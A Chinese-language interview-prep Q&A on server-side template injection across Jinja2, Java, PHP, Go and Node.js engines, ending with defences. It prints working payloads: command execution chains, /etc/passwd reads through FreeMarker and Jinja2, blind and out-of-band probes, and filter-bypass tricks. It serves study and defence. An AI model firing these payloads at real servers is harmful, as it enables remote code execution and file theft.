---

title: "模板注入 SSTI · 问答"
series_order: 2
date: 2026-04-13 12:00:00 +0800
categories:

  - 模板注入

---

{% raw %}

## 正文

### 入门

#### 1. SSTI 常见发生位置？如何用 `{{''.__class__.__mro__[1].__subclasses__()}}` 一类思路探查？

- 常见发生位置：用户输入被当成“模板源码”编译（`from_string/render_template_string/evaluate`、FreeMarker 的字符串模板、Thymeleaf 视图名拼接等）。
- 黑盒探查：先 `{{7*7}}`/`${7*7}` 这种无害表达式确认“会算”，再逐步摸到对象/全局变量（`config/request/lipsum`）。

#### 2. SSTI 和 XSS 的区别是什么？怎么快速判断“这是模板执行”还是“只是 HTML/JS 注入”？

- XSS 是浏览器端执行；SSTI 是服务端渲染阶段执行。
- 快速判断：若 `{{7*7}}` 直接回显 `49` 或报错栈包含模板引擎信息，优先 SSTI。

#### 3. 如何通过报错信息、语法特征、关键字快速识别目标模板引擎类型？（Jinja2 / FreeMarker / Velocity / Thymeleaf）

- Jinja2：`{{ }}` / `{% %}` / `|attr` / `~` 拼接；常见 `jinja2` 相关报错。
- FreeMarker：`${ }` / `<#assign>` / `?new` / `?api`；常见 `freemarker` 报错。
- Velocity：`$var` / `${var}` / `#set/#if/#foreach`；常见 `org.apache.velocity` 报错。
- Thymeleaf（Spring）：常见是“视图名/片段表达式”触发 SpEL；payload 里常出现 `::`、`__${...}__`、`T(java.lang.Runtime)`。

补充常见模板引擎与探测/测试语法（面试速记）：

| 语言 | 模板引擎 | 常见探测/测试 Payload（示例） |
|------|----------|-----------------------------|
| Python | Jinja2 | `{{ config }}`、`{{ 7*7 }}`、`{{ ''.__class__.__mro__[1].__subclasses__() }}` |
| Python | Tornado | `{{ handler.settings }}` |
| Java | FreeMarker | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
| Java | Velocity | `#set($e="java.lang.Runtime")$e.getRuntime().exec("id")` |
| Java | Thymeleaf | `__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x` |
| PHP | Twig | `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}` |
| PHP | Smarty | `{$smarty.version}`、`{php}echo system('id');{/php}`（老版本/危险用法） |
| JavaScript | Pug/Jade | `#{function(){return global.process.mainModule.require('child_process').execSync('id')}()}` |

#### 4. 黑盒场景下，如何用“无害算术/字符串”探测是否存在 SSTI？方法论步骤是什么？

- 先做“无害回显确认”：

  ```text
  Jinja2:     {{7*7}} / {{'a' ~ 'b'}}
  FreeMarker: ${7*7}  / ${"a" + "b"}
  Velocity:   #set($a=7)$a
  Thymeleaf:  多数不是“模板源码注入”，更偏向视图名/片段表达式链
  ```
- 再做“能力边界探测”：字符串拼接、条件分支、循环、报错触发，观察回显形态与错误信息是否带引擎栈。
- 最后做“上下文探针”：尝试打印疑似内置对象（`config/request/session`、`self`、常见 helper 函数），再决定走短链、长链或盲注/OOB。

#### 5. 典型危险编码模式有哪些？（`render_template_string` / `from_string` / `evaluate` / 视图名拼接等）

- Python/Flask：`render_template_string(user_input)`、`env.from_string(user_input).render(...)`
- FreeMarker：`StringTemplateLoader.putTemplate(..., user_input)` + `Template.process(...)`
- Velocity：`ve.evaluate(context, writer, ..., user_input)`
- Thymeleaf：`return "prefix/" + user_input + "/view"`（视图名可控）

### Python/Jinja2（短链优先）

#### 1. “短链”核心思路是什么？为什么更稳定？常见短链入口有哪些？

- 核心：直接找到“函数对象”，再从函数对象取 `__globals__` 或 `__builtins__`，避免依赖 `__subclasses__()` 的不稳定枚举。
- 典型入口：
  - Jinja2 默认导出的 helper（`lipsum/cycler/joiner/namespace`）
  - Web 框架默认注入的函数（例如 Flask 里常见 `url_for/get_flashed_messages`，取决于应用是否注入）

```jinja2
{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

#### 2. 如果上下文被严格限制（连 `lipsum` 都没了），怎么系统性挖掘可用入口？

- 先做“可见对象盘点”：能打印就尽量打印（`{{self}}`、`{{config}}`、`{{request}}`、`{{session}}`、`{{g}}`），看有哪些对象存在且可继续属性访问。
- 优先找“函数/方法”而不是“数据对象”：函数更可能有 `__globals__`；数据对象更多是信息泄露点。
- 若能拿到任意函数对象，先验证 `__globals__` 是否存在，再去找 `__builtins__/__import__`，最后再考虑 `os/subprocess/urllib` 等能力。

#### 3. Jinja2 经典长链（`__class__`→`__mro__`→`__subclasses__`→`__globals__`）的核心思路是什么？每一步在找什么？

```jinja2
{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['os'].popen('id').read() }}
```

- `__class__/__mro__`：从任意对象定位到 `<class 'object'>`
- `__subclasses__()`：枚举当前进程已加载的类，找“能通向危险模块”的类
- `[IDX]`：选中一个其 `__init__` 的全局作用域中引用了 `os/subprocess` 的类
- `__globals__`：跳到函数定义时的全局命名空间，提取模块/内置

#### 4. 为什么 subclasses 索引不稳定？实战里怎么减少对硬编码索引的依赖？

- 不稳定原因：Python 版本、依赖加载顺序、运行环境差异导致 `__subclasses__()` 列表顺序变化。
- 实战优先：走“短链”，或先做信息收集（报错栈、已加载模块、上下文对象），再决定是否需要枚举 subclasses。

#### 5. 现代环境里“长链经常失效”的常见原因有哪些？实战怎么打？

- 常见失效原因（更常见是“引擎/应用侧加固”，不只是 Python 版本）：
  - 模板沙箱/属性访问限制：阻断 `__xx__`、禁用 `attr`、限制可访问属性或可调用对象
  - 输入过滤：关键字、括号、引号、管道符被禁，导致链式调用无法成立
  - 上下文最小化：没有导出任何可用函数对象，短链入口被清空
- 实战应对优先级：
  - 先短链，找任何函数对象的 `__globals__`
  - 能做任意文件读/信息泄露就先拿信息（配置、环境变量、源码路径），再决定下一步
  - 无回显时切 OOB/时间盲注，先验证“代码路径可达”

#### 6. 只有回显、没有回显、半回显三种场景下分别怎么做验证与数据带出？（布尔盲注 / 逐字符 / OOB）

- 有回显：命令执行/文件读直接输出。
- 半回显：用布尔判断输出固定字符串：

```jinja2
{% if 'root:' in lipsum.__globals__['os'].popen('cat /etc/passwd').read() %}OK{% endif %}
```

- 时间盲注示例（让分支执行产生可观测延迟）：

```jinja2
{% if 7*7 == 49 %}{{ lipsum.__globals__['__builtins__']['__import__']('time').sleep(3) }}{% endif %}
```

- HTTP OOB 示例（出网允许时用于确认代码路径可达）：

```jinja2
{{ lipsum.__globals__['__builtins__']['__import__']('urllib.request').urlopen('http://example.com/ping?a=1') }}
```

#### 7. 常见报错如何定位问题？

- `UndefinedError: 'xxx' is undefined`：变量不在上下文里，换入口（`self/config/request`）或重新识别引擎。
- `AttributeError: 'NoneType' object has no attribute '__globals__'`：取到的不是函数对象，或沙箱阻断；先打印类型，再换成已知函数入口（`lipsum/url_for/...`）。
- `SecurityError`/`SandboxedEnvironment`：属于引擎防护命中，常规链会被拦截，转向信息泄露/OOB/业务链更现实。

#### 8. 除了 RCE，SSTI 常见还能造成哪些影响？（任意文件读、敏感信息泄露、SSRF 等）

- 任意文件读、源码/配置泄露、环境变量泄露
- 敏感对象泄露（`config/secret_key` 等）
- SSRF/内网探测（取决于可用网络能力）

### Go 模板注入（text/template、html/template）

#### 1. Go 的 text/template 与 html/template 的 SSTI 特点是什么？与 Python/Java 最大差异在哪里？

- 语法：`{{ ... }}`，以 `.` 为当前数据根；`html/template` 额外做 HTML 上下文转义，防 XSS，但不等于防“模板注入”。
- 最大差异：Go 模板没有类似 Python 的通用反射链；能做什么高度取决于开发者注入了什么数据与函数。

#### 2. Go 模板如何做信息收集与类型探测？

```gotemplate
{{.}}
{{printf "%T" .}}
{{printf "%T" .User}}
{{range $k, $v := .}}{{printf "%s => %T\n" $k $v}}{{end}}
```

#### 3. Go 模板想打到“危险能力”通常依赖什么条件？

- 注入了函数引用（例如把文件读/命令执行/HTTP 请求的包装函数暴露出来）。
- 注入了带危险方法的对象（例如自定义对象方法里封装了命令执行/文件读/网络访问）。

#### 4. 典型高频场景有哪些？

- Web 框架里把用户输入拼进模板并 `Parse/Execute`。
- Helm/K8s 渲染链路中把不可信值拼进模板片段、或把用户可控片段作为模板渲染。

### Node.js 模板注入（EJS / Pug / Nunjucks）

#### 1. 常见 Node.js 模板引擎如何快速识别？各自表达式/语法特征是什么？

- EJS：`<%= 7*7 %>`、`<% ... %>`
- Pug：`#{7*7}`、`- var a = 1` 这类行首语法
- Nunjucks：`{{ 7*7 }}`、`{% if %}`，外观与 Jinja2 很像

#### 2. Node.js 模板注入的 RCE/数据读取常见路径是什么？与 JavaScript 原型链/全局对象有什么关系？

- 若引擎允许执行任意 JS 表达式/语句（例如 EJS 的脚本块），核心就是拿到能访问模块加载、进程对象或文件系统 API 的入口。
- 许多“看似禁了关键字”的场景会被原型链/属性访问绕开，所以面试里经常会问“你怎么绕过过滤拿到可用入口”。

#### 3. 如果 `require` 不可用或被封，实战中常见的替代思路是什么？

- 依赖上下文：尝试从现有对象拿到 `process`、`globalThis`、或应用注入的 helper；如果上下文干净、引擎限制严格，很多情况下只能退回到信息泄露或业务侧链路。

### Java 模板引擎

#### 1. FreeMarker 低版本与高版本常见利用点分别是什么？（`Execute` / `ObjectConstructor` / `?api`）为什么 ObjectConstructor 能实例化任意类？

- 低版本历史姿势：`"freemarker.template.utility.Execute"?new()("calc")`
- 高版本更通用：`"freemarker.template.utility.ObjectConstructor"?new()` 构造 `ProcessBuilder`
- 受限场景：`?api` 暴露底层 Java 对象，走反射链（前提是上下文里有可用对象）
- ObjectConstructor 为什么能实例化任意类？：`freemarker.template.utility.ObjectConstructor` 这个类是 FreeMarker 官方写的，它实现了 `TemplateMethodModelEx` 接口。官方写它的初衷是为了方便在模板里动态创建一些数据对象，但没想到成了安全的大后门。

文件读（高频）：

```ftl
<#include "file:///etc/passwd">
```

或者使用 `ObjectConstructor` 结合 `BufferedReader`（循环读取）：

```ftl
<#assign bs="freemarker.template.utility.ObjectConstructor"?new()("java.io.BufferedReader","freemarker.template.utility.ObjectConstructor"?new()("java.io.FileReader","/etc/passwd"))>
<#list 1..100 as i>
    ${bs.readLine()}
</#list>
```

或者使用 `ObjectConstructor` 结合 `Scanner`（一把梭，更优雅）：

```ftl
${"freemarker.template.utility.ObjectConstructor"?new()("java.util.Scanner", "freemarker.template.utility.ObjectConstructor"?new()("java.io.File", "/etc/passwd")).useDelimiter("\\A").next()}
```
*(解释：`Scanner` 读取文件，`\A` 是正则里的开头，`useDelimiter("\\A").next()` 意味着把整个文件作为一个 Token 吐出来。)*

#### 2. Velocity 的典型利用起点是什么？为什么经常需要“上下文里已有对象”？

- 常见从模板里可获得的对象（字符串等）出发，通过 `getClass()` 开启反射链到 `Runtime/ProcessBuilder`。
- 安全内省器/黑名单启用后，利用会显著受限，因此更依赖上下文里已有的“工具类/可反射对象”。

#### 3. Thymeleaf 为什么会出现“视图名注入 / 片段表达式”类问题？`::` 与 `__${}__` 在链里分别起什么作用？

- `::` 让渲染流程进入“片段表达式”分支。
- `__${...}__` 会被 Thymeleaf 预处理器识别并执行其中的 SpEL 表达式，从而可能触发 RCE。

### 过滤绕过（以 Jinja2 为主）

#### 1. 过滤了 `.` 时有哪些绕过方式？（`[]`、`attr`、request 传参等）

```jinja2
{{ foo['bar'] }}
{{ foo|attr('bar') }}
{{ foo|attr(request.args.k) }}
```

#### 2. 过滤了 `[]` 时如何绕过？（`pop()` 等）

- 列表取索引可尝试：`list|attr('pop')(i)`（是否可用取决于过滤与沙箱）
- 或尽量换“短链”减少索引依赖

#### 3. 过滤了 `__` 时如何绕过？（`request.args`、`session` 拼接等）

```jinja2
{{ lipsum|attr(request.args.g) }}
```

#### 4. 过滤了 `_` 时有哪些思路？（`dir(0)`、`request['args']`、Unicode 等）

- 让 `_` 出现在请求参数里（模板只读 `request.args`），成功率通常高于纯模板内构造。

#### 5. 过滤引号时如何用 `request.args` / Cookie / 拼接等绕过？

- 把字符串放到 `request.args/cookies`，模板端不出现引号。

#### 6. 过滤花括号 `{}` 时如何利用 `{% %}`、`print` 等？

```jinja2
{% if 7*7 == 49 %}OK{% endif %}
{% print('test') %}
```

#### 7. 过滤数字时如何用长度、`set`、算术、`lipsum` 索引等构造数字？

```jinja2
{% set one = 'a'|length %}
{% set two = 'aa'|length %}
{% set three = one + two %}
```

#### 8. 过滤 `class`、`mro`、`subclasses` 等关键词时如何拼接或换入口？

```jinja2
{{ ''|attr('cla' ~ 'ss')|attr('m' ~ 'ro') }}
```

#### 9. 过滤 `globals` 时链式访问、`init.self` 等思路？

- 关键是换入口或拆分特征：用 `request.args` 传关键字，模板里只做 `attr(变量)`。

#### 10. 过滤了 `|`（过滤器管道）时怎么做属性访问与链式调用？有哪些替代语法入口？

- 优先回退到 `.` / `[]`（若没被禁）；三者同时被禁时，多数情况下很难再拉出可用的 RCE 链。

#### 11. 过滤了括号 `()` 或逗号 `,` 时还剩哪些“非调用型”利用面？（信息泄露、探测、报错回显）

- `()` 被卡通常意味着很难函数调用；剩余价值更多是指纹、信息泄露与进一步突破的铺垫。

#### 12. `__init__` 被过滤/不可用时还有哪些替代入口能拿到 `__globals__`？

- 目标仍然是“找到函数对象”，不一定非要 `__init__`。
- 一些类会实现上下文管理或析构相关方法，实战里可尝试找同类的其他方法再取 `__globals__`（是否可达取决于沙箱/过滤）。

### 防御与排查

#### 1. 从代码层面如何定位“用户输入被当成模板编译”的入口？（常见框架/函数/配置点）

- 搜索动态模板编译 API：`render_template_string/from_string/evaluate/process`、可控视图名拼接等。
- 排查模板上下文注入：是否注入了 `request/session/config`、服务对象、工具类对象。

#### 2. 为什么黑名单/WAF 很难彻底防住 SSTI？更可靠的工程化防御是什么？

- 模板语法等价变体太多，且可利用的对象模型/反射能力组合空间极大。
- 更可靠：分离模板与数据（模板固定/预编译，用户输入仅作为变量数据）+ 最小化模板上下文 + 启用安全配置。

#### 3. Jinja2/FreeMarker/Velocity 的“沙箱/安全配置”有哪些常见坑？上线前应该验证什么？

- 沙箱不是万能：历史上多次出现绕过；不要把沙箱当成唯一防线。
- 上线前验证：用户输入不触发动态编译；模板上下文不暴露敏感对象/反射入口；安全配置不可被运行时篡改。

#### 4. 企业安全审计中，除了搜代码，黑盒/灰盒怎么高效发现 SSTI？

- 参数 fuzz：对疑似模板相关参数（`name/template/view/content/url`）批量注入 `{{7*7}}`、`${7*7}`、`#{7*7}` 等观察回显与报错。
- 灰盒结合：查看错误日志/异常栈，快速定位模板引擎与渲染入口。
- 静态扫描配合：用规则匹配常见危险 API（例如 Python 的 `render_template_string`/`from_string`、Java 的 `evaluate/process` 形态）。

#### 5. 业务确实需要“用户自定义模板”时，架构上怎么做才安全？

- 隔离执行：把模板渲染放到隔离环境（独立进程/容器）运行，限制文件、网络、系统调用与资源配额。
- 限制能力：模板只允许展示逻辑，不允许任意代码执行；模板上下文只注入白名单数据结构与纯函数。
- 选型上优先“能力较弱、可控性强”的模板体系，并把“模板源码”与“用户数据”严格分离。

{% endraw %}
